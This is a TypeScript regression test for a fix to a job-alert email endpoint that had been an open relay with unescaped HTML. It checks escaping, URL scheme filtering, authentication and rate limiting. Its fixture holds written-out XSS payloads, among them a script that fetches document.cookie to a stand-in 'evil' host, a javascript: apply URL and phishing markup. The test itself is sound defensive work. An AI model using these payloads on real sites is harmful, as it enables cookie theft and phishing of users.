/**
 * tests/jobsAlertHardening.test.ts
 *
 * Reproduces audit finding C2: POST /api/jobs/alert was an unauthenticated open
 * email relay, and `name` / `job.*` / `applyUrl` were interpolated unescaped into
 * the Resend HTML → script/content injection + link spoofing.
 *
 * Part 1 (always) — the template renderer neutralizes every hostile value.
 *   Before the fix `lib/emails/jobAlert.ts` did not exist; the import failure is
 *   the reproduction ("no escaping layer exists").
 *
 * Part 2 (TEST_BASE_URL set) — the HTTP exploit fails: anon dispatch is blocked,
 *   the recipient is forced to the session user, and the bucket caps spam.
 *
 * Run:  npx tsx tests/jobsAlertHardening.test.ts
 *   or: TEST_BASE_URL=http://localhost:3125 npx tsx tests/jobsAlertHardening.test.ts
 */
import assert from "node:assert/strict";
import { escapeHtml, safeUrl, renderJobAlertEmail } from "../lib/emails/jobAlert";
import { signSessionCookie } from "../lib/session";

let failures = 0;
function check(name: string, fn: () => void | Promise<void>) {
  return Promise.resolve()
    .then(fn)
    .then(() => console.log(`  ok   ${name}`))
    .catch((err) => {
      failures += 1;
      console.error(`  FAIL ${name}\n       ${(err as Error).message}`);
    });
}

const EXPLOIT = {
  name: "<script>document.location='//evil'</script>",
  role: "Frontend",
  location: "</p><h1>PHISH: reset your password</h1>",
  job: {
    title: "<img src=x onerror=alert(document.cookie)>",
    company: '"><script>fetch("//evil?c="+document.cookie)</script>',
    location: "<b>Anywhere</b>",
    salary: { formatted: "<marquee>free money</marquee>" },
    applyUrl: "javascript:fetch('//evil')",
    descriptionSnippet: "</div><a href='//phish'>Click to claim</a>",
    jobType: "<script>1</script>",
  },
};

async function main() {
  // ── Part 1: pure renderer ───────────────────────────────────────────────
  await check("escapeHtml neutralizes the 5 significant chars", () => {
    assert.equal(escapeHtml(`<a href="x" onclick='y'>&</a>`), "&lt;a href=&quot;x&quot; onclick=&#39;y&#39;&gt;&amp;&lt;/a&gt;");
  });

  await check("safeUrl rejects non-http(s) schemes", () => {
    assert.equal(safeUrl("javascript:alert(1)"), "#");
    assert.equal(safeUrl("data:text/html,<script>1</script>"), "#");
    assert.equal(safeUrl("vbscript:msgbox(1)"), "#");
    assert.equal(safeUrl("not a url"), "#");
    assert.equal(safeUrl("https://jobs.example.com/123"), "https://jobs.example.com/123");
    assert.equal(safeUrl("HTTP://Example.com"), "HTTP://Example.com");
  });

  await check("renderJobAlertEmail escapes every hostile value", () => {
    const { subject, html } = renderJobAlertEmail({
      recipientName: EXPLOIT.name,
      role: EXPLOIT.role,
      location: EXPLOIT.location,
      job: EXPLOIT.job,
    });
    const blob = `${subject}\n${html}`;

    // None of the attacker's opening tags survive as real markup.
    for (const tag of [/<script/i, /<img\s/i, /<marquee/i, /<h1>PHISH/i, /<a href='\/\/phish'/i]) {
      assert.ok(!tag.test(blob), `injected markup survived: ${tag}`);
    }
    // No executable URI scheme anywhere.
    assert.ok(!/javascript:/i.test(blob), "javascript: URI present");
    // Every char after our own known tags must be escaped — no stray "<" + letter
    // beyond the template's own <div/<p/<h2/<h3/<strong/<a/<br.
    const strayTags = (html.match(/<([a-z][a-z0-9]*)/gi) || []).map((m) => m.slice(1).toLowerCase());
    const allowed = new Set(["div", "p", "h2", "h3", "strong", "a", "br"]);
    assert.deepEqual([...new Set(strayTags)].filter((t) => !allowed.has(t)), [], "unexpected tag in output");

    // The values ARE present, just escaped.
    assert.ok(html.includes("&lt;script&gt;"), "expected escaped <script>");
    assert.ok(html.includes("&lt;img src=x onerror=alert"), "expected escaped <img>");

    // The apply button/link collapses the javascript: URL to "#".
    assert.ok(html.includes('href="#"'), "javascript: applyUrl not collapsed to #");
    assert.ok(!/href="javascript:/i.test(html), "javascript: href present");
  });

  await check("a legitimate https applyUrl is preserved (but attribute-escaped)", () => {
    const { html } = renderJobAlertEmail({
      recipientName: "Alex",
      job: { title: "SWE", company: "Acme", applyUrl: 'https://acme.jobs/1?ref="><x' },
    });
    assert.ok(html.includes('href="https://acme.jobs/1?ref=&quot;&gt;&lt;x"'), "https URL lost or mis-escaped");
  });

  // ── Part 2: HTTP exploit ────────────────────────────────────────────────
  const base = process.env.TEST_BASE_URL;
  if (!base) {
    console.log("\n  (skipping HTTP checks — set TEST_BASE_URL to a running server)");
  } else {
    await check("anonymous dispatch is blocked (401)", async () => {
      const res = await fetch(`${base}/api/jobs/alert`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: "victim@example.com", ...EXPLOIT }),
      });
      assert.ok([401, 403].includes(res.status), `expected 401/403, got ${res.status}`);
    });

    await check("authenticated: recipient is forced to the session user, payload neutralized", async () => {
      const cookie = `cf_uid=${signSessionCookie({ email: "attacker@example.com" })}`;
      const res = await fetch(`${base}/api/jobs/alert`, {
        method: "POST",
        headers: { "content-type": "application/json", cookie },
        body: JSON.stringify({ email: "victim@example.com", ...EXPLOIT }),
      });
      assert.equal(res.status, 200, `expected 200, got ${res.status}`);
      const json = await res.json();
      assert.equal(json.recipient, "attacker@example.com", "recipient was taken from the body, not the session");
      assert.ok(!/<script/i.test(JSON.stringify(json)), "response echoes raw <script>");
    });

    await check("per-user rate limit returns 429 after the bucket drains", async () => {
      const cookie = `cf_uid=${signSessionCookie({ email: "burst@example.com" })}`;
      const codes: number[] = [];
      for (let i = 0; i < 5; i++) {
        const r = await fetch(`${base}/api/jobs/alert`, {
          method: "POST",
          headers: { "content-type": "application/json", cookie },
          body: JSON.stringify({ job: { title: "SWE" } }),
        });
        codes.push(r.status);
      }
      assert.equal(codes.filter((c) => c !== 429).length, 3, `expected 3 allowed, got ${codes}`);
      assert.ok(codes.includes(429), "expected a 429");
    });
  }

  if (failures > 0) {
    console.error(`\n${failures} check(s) failed`);
    process.exit(1);
  }
  console.log("\nall checks passed — anon relay blocked, recipient pinned to session, HTML neutralized");
}

main();
